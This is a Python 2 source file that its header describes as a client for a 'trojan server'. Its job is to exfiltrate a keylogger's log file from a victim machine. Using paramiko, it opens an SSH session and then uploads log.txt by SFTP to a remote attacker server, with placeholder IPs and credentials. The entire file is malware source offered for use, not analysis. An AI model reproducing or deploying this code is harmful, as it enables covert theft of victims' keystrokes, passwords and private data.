#########################################
#
# This is a demonstration of a client which will connect to our trojan server over ssh
# to send a known file which is the output of a keylogger installed on that client
#
#########################################
import paramiko
import threading
import subprocess
import os


class ssh():
    def __init__(self, filename='log.txt', sshServerIP = '<Your SSH server IP>', sshServerUsername = '<Your SSH server username>', sshServerPassword = '<Your SSH server password>'):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.filename = filename
        self.sshServerIP = sshServerIP
        self.sshServerUsername = sshServerUsername
        self.sshServerPassword = sshServerPassword
        self.chan = ''

    def initiateConnection(self):
        try:
            self.client.connect(self.sshServerIP, username=self.sshServerUsername, password=self.sshServerPassword)
            self.chan = self.client.get_transport().open_session()
        except Exception, e:
            return False
        return True

    def checkAlive(self):
        try:
            checkAlive = self.client.get_transport().is_active()
        except Exception, e:
            print 'In keyloggerClient.py: checkAlive() function believes the connection has not been initiated'
            print str(e) + '\n'
            return False
        if checkAlive == True:
            return True
        else:
            return False


    def sendFile(self):
        try:
            response = sftp(name=self.filename)
            self.chan.send(response)
            return response
        except Exception, e:
            print str(e)

    def sshKill(self):
        try:
            self.chan.send('exit')
            self.client.close
        except Exception, e:
            print str(e)

def sftp(name, local_path = os.getcwd(), sftpServerIP = '<Your SFTP server IP>', sftpServerPort = 21, sftpServerUsername = '<Your SFTP server username>', sftpServerPassword = '<Your SFTP Server Password>'):
    try:
        transport = paramiko.Transport((sftpServerIP, sftpServerPort))
        transport.connect(username=sftpServerUsername, password=sftpServerPassword)
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_path + '\\' + name, '/root/Desktop/upload/' + name)
        sftp.close()
        transport.close()
        return '[+] File sending Done!'
    except Exception, e:
        return str(e)